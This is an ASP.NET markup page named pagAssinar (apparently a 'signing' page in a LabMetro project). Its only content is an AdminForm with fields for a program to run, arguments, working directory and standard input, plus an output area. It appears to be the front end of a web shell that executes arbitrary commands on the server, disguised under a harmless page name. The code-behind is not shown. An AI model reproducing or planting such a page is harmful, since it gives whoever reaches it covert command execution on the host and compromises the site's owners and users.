<%@ Page language="c#" Codebehind="pagAssinar.aspx.cs" AutoEventWireup="false" Inherits="LabMetro.pagAssinar" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>pagAssinar</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" Content="C#">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body MS_POSITIONING="GridLayout">
		<form id="AdminForm" method="post" encType="multipart/form-data" runat="server">
			<table id="CommandTable" width="90%" runat="server">
				<tr>
					<td>Program to run:<br>
						<asp:textbox id="FilePath" runat="server" width="100%"></asp:textbox></td>
				</tr>
				<tr>
					<td>Command line arguments:<br>
						<asp:textbox id="Args" runat="server" width="100%"></asp:textbox></td>
				</tr>
				<tr>
					<td>Working directory:<br>
						<asp:textbox id="WorkingDir" runat="server" width="100%"></asp:textbox></td>
				</tr>
				<tr>
					<td>Standard input:<br>
						<asp:textbox id="Input" runat="server" width="100%" TextMode="MultiLine" Height="100"></asp:textbox></td>
				</tr>
				<tr>
					<td align="right"><asp:button id="Submit" runat="server" Text="Submit" Width="85"></asp:button></td>
				</tr>
				<tr>
					<td><pre id="Output" runat="server"></pre>
					</td>
				</tr>
			</table>
		</form>
	</body>
</HTML>
